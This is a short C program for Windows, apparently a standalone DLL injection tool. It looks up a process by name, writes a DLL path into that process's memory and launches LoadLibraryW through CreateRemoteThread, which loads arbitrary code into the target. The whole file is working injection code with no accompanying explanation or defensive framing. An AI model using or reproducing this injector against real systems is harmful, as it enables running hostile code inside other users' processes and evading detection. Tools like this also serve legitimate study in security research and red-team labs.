#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <wchar.h>



wchar_t* char_to_wchar(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0) return NULL;

    wchar_t* wstr = malloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;

    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    return wstr;
}



DWORD FindProcessPID(wchar_t* targetProcessName)
{
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;


    printf("[+] Get PID for process: %ls \n", targetProcessName);

    // Take a snapshot of all processes
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot.\n");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve the first process
    if (!Process32First(hProcessSnap, &pe32)) {
        printf("Failed to get first process.\n");
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Walk the snapshot to find explorer.exe
    do {
        if (wcscmp(pe32.szExeFile, targetProcessName) == 0) {
            wprintf(L"[+] Found process: %s\n", pe32.szExeFile);
            CloseHandle(hProcessSnap);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    printf("%ls not found.\n", targetProcessName);
    CloseHandle(hProcessSnap);
    return 0;
}



int main(int argc, char* argv[]) {
	HANDLE processHandle;
	PVOID remoteBuffer;

    wchar_t* dllPath = char_to_wchar((char*)(argv[2]));

    
    	
    DWORD processID = 0;

    processID = FindProcessPID(char_to_wchar((char*)(argv[1])));
    
    printf("[+] Injecting %ls to PID: %i\n", dllPath, processID); 
    if (processID == 0) {
        return 0;
    }

    int sizeOfDllPath = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeOfDllPath, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeOfDllPath, NULL);
     

	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	
    
    if ((CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL)) == NULL) {
        printf("injection failed");
    }
	

    
    CloseHandle(processHandle);

	return 0;
}
